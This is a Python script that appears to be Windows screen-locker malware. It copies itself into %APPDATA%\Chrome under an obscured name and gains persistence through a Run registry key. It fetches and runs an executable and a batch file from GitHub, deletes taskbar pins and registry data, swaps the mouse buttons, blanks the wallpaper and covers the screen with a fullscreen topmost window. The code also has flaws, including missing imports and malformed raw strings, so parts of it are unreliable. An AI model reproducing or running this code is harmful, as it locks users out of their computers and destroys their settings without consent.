import tkinter as tk
import os
import urllib.request

appdata = os.getenv("appdata")
file_name =  os.path.basename(sys.argv[0])
pathoffile = os.path.abspath(file_name)
strspace = '"'

os.mkdir(f'{appdata}\\Chrome')
os.system(f'COPY {strspace}{pathoffile}{strspace} {strspace}{appdata}'+r'\Chrome\'+f'{strspace}')
os.system(f'REN {strspace}{appdata}'+r'\Chrome\'+f'{file_name}{strspace} {strspace}NRXWG23FMQ======.exe{strspace}')
os.system(f'REG Add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "{appdata}'+r'\Chrome\NRXWG23FMQ======.exe" /f ')


urllib.request.urlretrieve("https://github.com/BoraOfficial/ScreenLocker/raw/main/BlankWallpaper/white_wallpaper.png", appdata+r'\white_bg.png')
urllib.request.urlretrieve("https://github.com/BoraOfficial/ScreenLocker/raw/main/NoDesktop/HideDesktopIcons.exe", appdata+r'\hideicons.exe')
urllib.request.urlretrieve("https://raw.githubusercontent.com/BoraOfficial/ScreenLocker/main/HideTaskbar/hide.bat", appdata+r'\hide.bat')

folder = appdata+"/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/"
for filename in os.listdir(folder):
    filepath = os.path.join(folder, filename)
    try:
        if os.path.isfile(filepath) or os.path.islink(filepath):
            os.unlink(filepath)
        elif os.path.isdir(filepath):
            shutil.rmtree(filepath)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (filepath, e))

os.system('REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband /F')

os.system("RUNDLL32.EXE USER32.DLL,SwapMouseButton") #swap mouse buttons
os.system(r'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "'+appdata+r'\white_bg.jpg" /f') # change wallpaper a blank wallpaper
os.startfile(appdata+r'\hideicons.exe')
os.startfile(appdata+r'\hide.bat')
root = tk.Tk()
root.overrideredirect(1)
root.attributes('-topmost', True)
root.attributes("-fullscreen", True)
root.mainloop()